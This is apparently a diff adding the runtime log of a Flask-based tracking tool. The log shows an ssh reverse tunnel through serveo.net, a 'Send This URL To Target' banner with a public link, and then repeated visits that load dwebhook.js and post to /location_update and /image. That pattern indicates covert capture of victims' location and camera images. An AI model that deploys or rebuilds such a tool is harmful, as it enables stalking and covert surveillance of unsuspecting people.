@@ -1,0 +1,224 @@
+2024-10-27 18:47:58,497 - [32m[+] [36mFlask server started! Running on [0mhttp://127.0.0.1:8000/
+ [31mPress CTRL+C to quit[0m
+2024-10-27 18:47:59,494 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.8.1.2:8000
+2024-10-27 18:47:59,496 - [33mPress CTRL+C to quit[0m
+2024-10-27 18:49:29,332 - [32m[+] [36mFlask server started! Running on [0mhttp://127.0.0.1:8000/
+ [31mPress CTRL+C to quit[0m
+2024-10-27 18:49:30,329 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.8.1.2:8000
+2024-10-27 18:49:30,330 - [33mPress CTRL+C to quit[0m
+2024-10-27 18:49:32,150 - 127.0.0.1 - - [27/Oct/2024 18:49:32] "GET / HTTP/1.1" 200 -
+2024-10-27 18:49:32,326 - 127.0.0.1 - - [27/Oct/2024 18:49:32] "GET /dwebhook.js HTTP/1.1" 200 -
+2024-10-27 18:49:32,420 - 127.0.0.1 - - [27/Oct/2024 18:49:32] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 18:49:33,167 - 127.0.0.1 - - [27/Oct/2024 18:49:33] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 18:49:33,591 - 127.0.0.1 - - [27/Oct/2024 18:49:33] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 18:49:34,342 - 127.0.0.1 - - [27/Oct/2024 18:49:34] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 18:49:56,067 - 127.0.0.1 - - [27/Oct/2024 18:49:56] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 18:50:14,308 - 127.0.0.1 - - [27/Oct/2024 18:50:14] "GET / HTTP/1.1" 200 -
+2024-10-27 18:50:14,892 - 127.0.0.1 - - [27/Oct/2024 18:50:14] "GET /dwebhook.js HTTP/1.1" 200 -
+2024-10-27 18:50:16,155 - 127.0.0.1 - - [27/Oct/2024 18:50:16] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 18:50:16,168 - 127.0.0.1 - - [27/Oct/2024 18:50:16] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 18:50:16,813 - 127.0.0.1 - - [27/Oct/2024 18:50:16] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 18:54:25,404 - 127.0.0.1 - - [27/Oct/2024 18:54:25] "GET /?yqrid=e4c95d5d HTTP/1.1" 200 -
+2024-10-27 18:54:26,127 - 127.0.0.1 - - [27/Oct/2024 18:54:26] "GET /dwebhook.js HTTP/1.1" 200 -
+2024-10-27 18:54:27,442 - 127.0.0.1 - - [27/Oct/2024 18:54:27] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 18:54:28,655 - 127.0.0.1 - - [27/Oct/2024 18:54:28] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 18:54:29,130 - 127.0.0.1 - - [27/Oct/2024 18:54:29] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 18:54:39,987 - 127.0.0.1 - - [27/Oct/2024 18:54:39] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:03:50,752 - 127.0.0.1 - - [27/Oct/2024 19:03:50] "GET / HTTP/1.1" 200 -
+2024-10-27 19:03:50,797 - 127.0.0.1 - - [27/Oct/2024 19:03:50] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:03:50,978 - 127.0.0.1 - - [27/Oct/2024 19:03:50] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:03:51,743 - 127.0.0.1 - - [27/Oct/2024 19:03:51] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:03:52,222 - 127.0.0.1 - - [27/Oct/2024 19:03:52] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:03:52,994 - 127.0.0.1 - - [27/Oct/2024 19:03:52] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:04:12,266 - [32m[+] [36mFlask server started! Running on [0mhttp://127.0.0.1:8000/
+ [31mPress CTRL+C to quit[0m
+2024-10-27 19:04:25,189 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.8.1.2:8000
+2024-10-27 19:04:25,189 - [33mPress CTRL+C to quit[0m
+2024-10-27 19:04:25,219 - 127.0.0.1 - - [27/Oct/2024 19:04:25] "GET / HTTP/1.1" 200 -
+2024-10-27 19:04:25,586 - 127.0.0.1 - - [27/Oct/2024 19:04:25] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:04:25,655 - 127.0.0.1 - - [27/Oct/2024 19:04:25] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:04:26,458 - 127.0.0.1 - - [27/Oct/2024 19:04:26] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:04:26,664 - 127.0.0.1 - - [27/Oct/2024 19:04:26] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:04:27,243 - 127.0.0.1 - - [27/Oct/2024 19:04:27] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:04:29,940 - 127.0.0.1 - - [27/Oct/2024 19:04:29] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:05:55,867 - Starting port forwarding with command: ssh -R 80:localhost:8000 serveo.net
+2024-10-27 19:05:55,867 - [32m[+] [36mFlask server started! Running on [0mhttp://127.0.0.1:8000/
+ [31mPress CTRL+C to quit[0m
+2024-10-27 19:05:57,884 - 
+[35m[+] [36mSend This URL To Target: [32mhttps://fb2ba55002ccee6a2d316fcdf095bf68.serveo.net[0m
+ [31mDon't close this window![0m
+2024-10-27 19:06:08,800 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.8.1.2:8000
+2024-10-27 19:06:08,800 - [33mPress CTRL+C to quit[0m
+2024-10-27 19:06:08,989 - 127.0.0.1 - - [27/Oct/2024 19:06:08] "GET / HTTP/1.1" 200 -
+2024-10-27 19:06:09,136 - 127.0.0.1 - - [27/Oct/2024 19:06:09] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:06:09,219 - 127.0.0.1 - - [27/Oct/2024 19:06:09] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:06:10,340 - 127.0.0.1 - - [27/Oct/2024 19:06:10] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:06:11,268 - 127.0.0.1 - - [27/Oct/2024 19:06:11] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:06:11,960 - 127.0.0.1 - - [27/Oct/2024 19:06:11] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:06:15,257 - 127.0.0.1 - - [27/Oct/2024 19:06:15] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:07:45,405 - [32m[+] [36mFlask server started! Running on [0mhttp://127.0.0.1:8000/
+ [31mPress CTRL+C to quit[0m
+2024-10-27 19:07:57,583 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.8.1.2:8000
+2024-10-27 19:07:57,583 - [33mPress CTRL+C to quit[0m
+2024-10-27 19:08:02,562 - 127.0.0.1 - - [27/Oct/2024 19:08:02] "GET / HTTP/1.1" 200 -
+2024-10-27 19:08:02,771 - 127.0.0.1 - - [27/Oct/2024 19:08:02] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:08:02,911 - 127.0.0.1 - - [27/Oct/2024 19:08:02] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:08:03,661 - 127.0.0.1 - - [27/Oct/2024 19:08:03] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:08:03,884 - 127.0.0.1 - - [27/Oct/2024 19:08:03] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:08:04,648 - 127.0.0.1 - - [27/Oct/2024 19:08:04] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:08:13,836 - 127.0.0.1 - - [27/Oct/2024 19:08:13] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:08:24,905 - 127.0.0.1 - - [27/Oct/2024 19:08:24] "GET / HTTP/1.1" 200 -
+2024-10-27 19:08:24,962 - 127.0.0.1 - - [27/Oct/2024 19:08:24] "GET /dwebhook.js HTTP/1.1" 200 -
+2024-10-27 19:08:27,213 - 127.0.0.1 - - [27/Oct/2024 19:08:27] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:08:28,181 - 127.0.0.1 - - [27/Oct/2024 19:08:28] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:08:28,719 - 127.0.0.1 - - [27/Oct/2024 19:08:28] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:08:29,551 - 127.0.0.1 - - [27/Oct/2024 19:08:29] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:10:17,357 - [32m[+] [36mFlask server started! Running on [0mhttp://127.0.0.1:8000/
+ [31mPress CTRL+C to quit[0m
+2024-10-27 19:10:29,544 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.8.1.2:8000
+2024-10-27 19:10:29,544 - [33mPress CTRL+C to quit[0m
+2024-10-27 19:10:29,588 - 127.0.0.1 - - [27/Oct/2024 19:10:29] "GET / HTTP/1.1" 200 -
+2024-10-27 19:10:29,743 - 127.0.0.1 - - [27/Oct/2024 19:10:29] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:10:29,800 - 127.0.0.1 - - [27/Oct/2024 19:10:29] "GET / HTTP/1.1" 200 -
+2024-10-27 19:10:29,813 - 127.0.0.1 - - [27/Oct/2024 19:10:29] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:10:29,823 - 127.0.0.1 - - [27/Oct/2024 19:10:29] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:10:29,859 - 127.0.0.1 - - [27/Oct/2024 19:10:29] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:10:30,568 - 127.0.0.1 - - [27/Oct/2024 19:10:30] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:10:30,744 - 127.0.0.1 - - [27/Oct/2024 19:10:30] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:10:30,805 - 127.0.0.1 - - [27/Oct/2024 19:10:30] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:10:30,813 - 127.0.0.1 - - [27/Oct/2024 19:10:30] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:10:31,071 - 127.0.0.1 - - [27/Oct/2024 19:10:31] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:10:31,201 - 127.0.0.1 - - [27/Oct/2024 19:10:31] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:10:31,297 - 127.0.0.1 - - [27/Oct/2024 19:10:31] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:12:14,594 - [32m[+] [36mFlask server started! Running on [0mhttp://127.0.0.1:8000/
+ [31mPress CTRL+C to quit[0m
+2024-10-27 19:12:16,489 - 127.0.0.1 - - [27/Oct/2024 19:12:16] "GET / HTTP/1.1" 200 -
+2024-10-27 19:12:16,535 - 127.0.0.1 - - [27/Oct/2024 19:12:16] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:12:16,695 - 127.0.0.1 - - [27/Oct/2024 19:12:16] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:12:17,815 - 127.0.0.1 - - [27/Oct/2024 19:12:17] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:12:17,818 - 127.0.0.1 - - [27/Oct/2024 19:12:17] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:12:18,680 - 127.0.0.1 - - [27/Oct/2024 19:12:18] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:12:19,176 - 127.0.0.1 - - [27/Oct/2024 19:12:19] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:12:26,797 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.8.1.2:8000
+2024-10-27 19:12:26,799 - [33mPress CTRL+C to quit[0m
+2024-10-27 19:13:20,946 - [32m[+] [36mFlask server started! Running on [0mhttp://127.0.0.1:8000/
+ [31mPress CTRL+C to quit[0m
+2024-10-27 19:13:23,048 - 127.0.0.1 - - [27/Oct/2024 19:13:23] "GET / HTTP/1.1" 200 -
+2024-10-27 19:13:23,087 - 127.0.0.1 - - [27/Oct/2024 19:13:23] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:13:23,281 - 127.0.0.1 - - [27/Oct/2024 19:13:23] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:13:24,022 - 127.0.0.1 - - [27/Oct/2024 19:13:24] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:13:24,085 - 127.0.0.1 - - [27/Oct/2024 19:13:24] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:13:25,564 - 127.0.0.1 - - [27/Oct/2024 19:13:25] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:13:28,417 - 127.0.0.1 - - [27/Oct/2024 19:13:28] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:13:33,117 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.8.1.2:8000
+2024-10-27 19:13:33,118 - [33mPress CTRL+C to quit[0m
+2024-10-27 19:15:21,256 - 127.0.0.1 - - [27/Oct/2024 19:15:21] "GET / HTTP/1.1" 200 -
+2024-10-27 19:15:21,657 - 127.0.0.1 - - [27/Oct/2024 19:15:21] "GET /dwebhook.js HTTP/1.1" 200 -
+2024-10-27 19:15:22,685 - 127.0.0.1 - - [27/Oct/2024 19:15:22] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:15:24,068 - 127.0.0.1 - - [27/Oct/2024 19:15:24] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:15:25,101 - 127.0.0.1 - - [27/Oct/2024 19:15:25] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:15:29,618 - 127.0.0.1 - - [27/Oct/2024 19:15:29] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+2024-10-27 19:15:41,981 - 127.0.0.1 - - [27/Oct/2024 19:15:41] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:18:28,909 - [32m[+] [36mFlask server started! Running on [0mhttp://127.0.0.1:8000/
+ [31mPress CTRL+C to quit[0m
+2024-10-27 19:18:31,209 - 127.0.0.1 - - [27/Oct/2024 19:18:31] "GET / HTTP/1.1" 200 -
+2024-10-27 19:18:31,246 - 127.0.0.1 - - [27/Oct/2024 19:18:31] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:18:31,409 - 127.0.0.1 - - [27/Oct/2024 19:18:31] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:18:32,226 - 127.0.0.1 - - [27/Oct/2024 19:18:32] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:18:32,372 - 127.0.0.1 - - [27/Oct/2024 19:18:32] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:18:33,419 - 127.0.0.1 - - [27/Oct/2024 19:18:33] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:18:33,534 - 127.0.0.1 - - [27/Oct/2024 19:18:33] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:18:41,063 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.8.1.2:8000
+2024-10-27 19:18:41,063 - [33mPress CTRL+C to quit[0m
+2024-10-27 19:19:13,380 - 127.0.0.1 - - [27/Oct/2024 19:19:13] "GET / HTTP/1.1" 200 -
+2024-10-27 19:19:13,709 - 127.0.0.1 - - [27/Oct/2024 19:19:13] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:19:14,091 - 127.0.0.1 - - [27/Oct/2024 19:19:14] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:19:14,764 - 127.0.0.1 - - [27/Oct/2024 19:19:14] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:19:15,738 - 127.0.0.1 - - [27/Oct/2024 19:19:15] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:19:21,423 - 127.0.0.1 - - [27/Oct/2024 19:19:21] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:20:40,330 - 127.0.0.1 - - [27/Oct/2024 19:20:40] "GET / HTTP/1.1" 200 -
+2024-10-27 19:20:41,111 - 127.0.0.1 - - [27/Oct/2024 19:20:41] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:20:42,231 - 127.0.0.1 - - [27/Oct/2024 19:20:42] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:20:42,958 - 127.0.0.1 - - [27/Oct/2024 19:20:42] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:20:58,440 - 127.0.0.1 - - [27/Oct/2024 19:20:58] "GET /?yqrid=e3a4bb39 HTTP/1.1" 200 -
+2024-10-27 19:20:58,772 - 127.0.0.1 - - [27/Oct/2024 19:20:58] "GET /dwebhook.js HTTP/1.1" 200 -
+2024-10-27 19:20:59,236 - 127.0.0.1 - - [27/Oct/2024 19:20:59] "[31m[1mPOST /location_update HTTP/1.1[0m" 400 -
+2024-10-27 19:20:59,508 - 127.0.0.1 - - [27/Oct/2024 19:20:59] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:21:00,423 - 127.0.0.1 - - [27/Oct/2024 19:21:00] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:21:09,271 - 127.0.0.1 - - [27/Oct/2024 19:21:09] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:21:20,599 - 127.0.0.1 - - [27/Oct/2024 19:21:20] "GET /?yqrid=e3a4bb39 HTTP/1.1" 200 -
+2024-10-27 19:21:20,934 - 127.0.0.1 - - [27/Oct/2024 19:21:20] "GET /dwebhook.js HTTP/1.1" 200 -
+2024-10-27 19:21:21,319 - 127.0.0.1 - - [27/Oct/2024 19:21:21] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:21:22,467 - 127.0.0.1 - - [27/Oct/2024 19:21:22] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:21:22,477 - 127.0.0.1 - - [27/Oct/2024 19:21:22] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:21:58,661 - 127.0.0.1 - - [27/Oct/2024 19:21:58] "GET /?clckid=8e8e6aa8 HTTP/1.1" 200 -
+2024-10-27 19:21:59,106 - 127.0.0.1 - - [27/Oct/2024 19:21:59] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:22:00,274 - 127.0.0.1 - - [27/Oct/2024 19:22:00] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:22:00,504 - 127.0.0.1 - - [27/Oct/2024 19:22:00] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:22:00,989 - 127.0.0.1 - - [27/Oct/2024 19:22:00] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:22:56,206 - 127.0.0.1 - - [27/Oct/2024 19:22:56] "GET /?yqrid=e3a4bb39 HTTP/1.1" 200 -
+2024-10-27 19:22:57,212 - 127.0.0.1 - - [27/Oct/2024 19:22:57] "GET /dwebhook.js HTTP/1.1" 200 -
+2024-10-27 19:22:59,108 - 127.0.0.1 - - [27/Oct/2024 19:22:59] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:23:01,873 - 127.0.0.1 - - [27/Oct/2024 19:23:01] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:23:04,887 - 127.0.0.1 - - [27/Oct/2024 19:23:04] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:23:38,621 - 127.0.0.1 - - [27/Oct/2024 19:23:38] "GET /?clckid=8e8e6aa8 HTTP/1.1" 200 -
+2024-10-27 19:23:39,121 - 127.0.0.1 - - [27/Oct/2024 19:23:39] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:23:39,625 - 127.0.0.1 - - [27/Oct/2024 19:23:39] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:23:40,415 - 127.0.0.1 - - [27/Oct/2024 19:23:40] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:23:41,714 - 127.0.0.1 - - [27/Oct/2024 19:23:41] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:24:07,264 - 127.0.0.1 - - [27/Oct/2024 19:24:07] "GET /?clckid=8e8e6aa8 HTTP/1.1" 200 -
+2024-10-27 19:24:07,713 - 127.0.0.1 - - [27/Oct/2024 19:24:07] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 19:24:08,903 - 127.0.0.1 - - [27/Oct/2024 19:24:08] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:24:09,116 - 127.0.0.1 - - [27/Oct/2024 19:24:09] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 19:24:09,701 - 127.0.0.1 - - [27/Oct/2024 19:24:09] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:24:10,155 - 127.0.0.1 - - [27/Oct/2024 19:24:10] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 19:24:11,636 - 127.0.0.1 - - [27/Oct/2024 19:24:11] "OPTIONS /image HTTP/1.1" 200 -
+2024-10-27 19:24:12,976 - 127.0.0.1 - - [27/Oct/2024 19:24:12] "POST /image HTTP/1.1" 200 -
+2024-10-27 19:24:13,326 - 127.0.0.1 - - [27/Oct/2024 19:24:13] "OPTIONS /image HTTP/1.1" 200 -
+2024-10-27 19:24:14,321 - 127.0.0.1 - - [27/Oct/2024 19:24:14] "OPTIONS /image HTTP/1.1" 200 -
+2024-10-27 19:24:14,786 - 127.0.0.1 - - [27/Oct/2024 19:24:14] "POST /image HTTP/1.1" 200 -
+2024-10-27 19:24:15,655 - 127.0.0.1 - - [27/Oct/2024 19:24:15] "POST /image HTTP/1.1" 200 -
+2024-10-27 19:24:16,641 - 127.0.0.1 - - [27/Oct/2024 19:24:16] "OPTIONS /image HTTP/1.1" 200 -
+2024-10-27 19:24:17,199 - 127.0.0.1 - - [27/Oct/2024 19:24:17] "OPTIONS /image HTTP/1.1" 200 -
+2024-10-27 19:24:17,907 - 127.0.0.1 - - [27/Oct/2024 19:24:17] "POST /image HTTP/1.1" 200 -
+2024-10-27 19:24:18,405 - 127.0.0.1 - - [27/Oct/2024 19:24:18] "POST /image HTTP/1.1" 200 -
+2024-10-27 21:36:27,315 - [32m[+] [36mFlask server started! Running on [0mhttp://127.0.0.1:8000/
+ [31mPress CTRL+C to quit[0m
+2024-10-27 21:36:39,602 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:8000
+ * Running on http://10.8.1.2:8000
+2024-10-27 21:36:39,602 - [33mPress CTRL+C to quit[0m
+2024-10-27 21:36:39,795 - 127.0.0.1 - - [27/Oct/2024 21:36:39] "GET / HTTP/1.1" 200 -
+2024-10-27 21:36:40,135 - 127.0.0.1 - - [27/Oct/2024 21:36:40] "[36mGET /dwebhook.js HTTP/1.1[0m" 304 -
+2024-10-27 21:36:40,221 - 127.0.0.1 - - [27/Oct/2024 21:36:40] "GET /get_target HTTP/1.1" 200 -
+2024-10-27 21:36:42,380 - 127.0.0.1 - - [27/Oct/2024 21:36:42] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 21:36:42,973 - 127.0.0.1 - - [27/Oct/2024 21:36:42] "POST /location_update HTTP/1.1" 200 -
+2024-10-27 21:36:43,838 - 127.0.0.1 - - [27/Oct/2024 21:36:43] "POST /location_update HTTP/1.1" 200 -
